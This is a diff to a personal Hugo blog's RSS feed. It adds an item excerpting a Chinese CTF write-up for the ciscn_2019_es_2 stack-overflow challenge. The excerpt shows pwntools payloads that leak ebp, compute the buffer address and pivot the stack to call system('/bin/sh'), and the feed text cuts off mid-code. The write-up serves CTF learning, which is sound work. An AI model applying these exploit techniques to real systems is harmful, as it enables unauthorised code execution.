@@ -6,7 +6,7 @@
     <description>Recent content in Posts on Dong</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 18 Jul 2021 18:45:55 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 19 Jul 2021 23:25:46 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Resultados de Búsqueda</title>
       <link>https://shaodongshi.github.io/search/</link>
@@ -174,6 +174,29 @@ No content shown here is rendered, all content is based in the template layouts/
 Setting a very low sitemap priority will tell search engines this is not important content.
 This implementation uses Fusejs, jquery and mark.js
 Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>栈溢出示例</title>
+      <link>https://shaodongshi.github.io/posts/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%A4%BA%E4%BE%8B/</link>
+      <pubDate>Mon, 19 Jul 2021 23:25:46 +0800</pubDate>
+      
+      <guid>https://shaodongshi.github.io/posts/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%A4%BA%E4%BE%8B/</guid>
+      <description>栈溢出示例 0x1 例题：ciscn_2019_es_2 链接：https://buuoj.cn/challenges
+0x2 过程 1. 32位，开了NX保护。
+2. 直接看ida。
+主要是这3个函数。main就是打印一句话。vul里面调用了两次read，都是往s所在的栈上写入0x30大小的内容。
+但是s却只有0x28的大小，所以存在栈溢出。但是因为0x30-0x28=0x8，所以溢出空间很小，无法构造有效的rop链。
+这时就需要栈迁移技术了。
+发现bss段没有充足的空间可供我们伪造栈。又想起两次两次read都是写入相同的栈上。于是想要栈迁移到自身上。这时需要确定栈的起始地址和结束地址。而结束地址此时等同于rbp的值，可以利用printf泄露。
+因为只有遇到\x00才会停止打印。于是构造第一个payload泄露rbp的值。
+payload = &amp;#39;a&amp;#39;*0x20+&amp;#39;b&amp;#39;*8 p.recvuntil(&amp;#34;name?\n&amp;#34;) p.send(payload) p.recvuntil(&amp;#39;bbbbbbbb&amp;#39;) ebp_addr = u32(p.recv(4)) print hex(ebp_addr) 此时还需要s的地址。但是我们只要知道s到栈底的偏移就可以间接得到了。
+payload = &amp;#39;a&amp;#39;*0x20+&amp;#39;b&amp;#39;*8 p.recvuntil(&amp;#34;name?\n&amp;#34;) p.send(payload) p.recvuntil(&amp;#39;bbbbbbbb&amp;#39;) ebp_addr = u32(p.recv(4)) print hex(ebp_addr) gdb.attach(p,&amp;#34;b *&amp;#34;+&amp;#39;0x080485be&amp;#39;) p.interactive() 得到rbp的值。0xff8ded88
+从esp可以看到当s的开头地址为0xff8ded50.
+得到偏移为0x88-0x50=0x38
+则s_addr = ebp - 0x38
+构造第二个payload
+payload1 = p32(s_addr) + p32(sys_addr) + p32(main_addr) + p32(s_addr + 0x10) payload1+= &amp;#39;/bin/sh\x00&amp;#39; payload1 = (payload1).ljust(0x28,&amp;#39;c&amp;#39;) payload1+= p32(s_addr) + p32(leave_ret) p.</description>
     </item>
     
     <item>
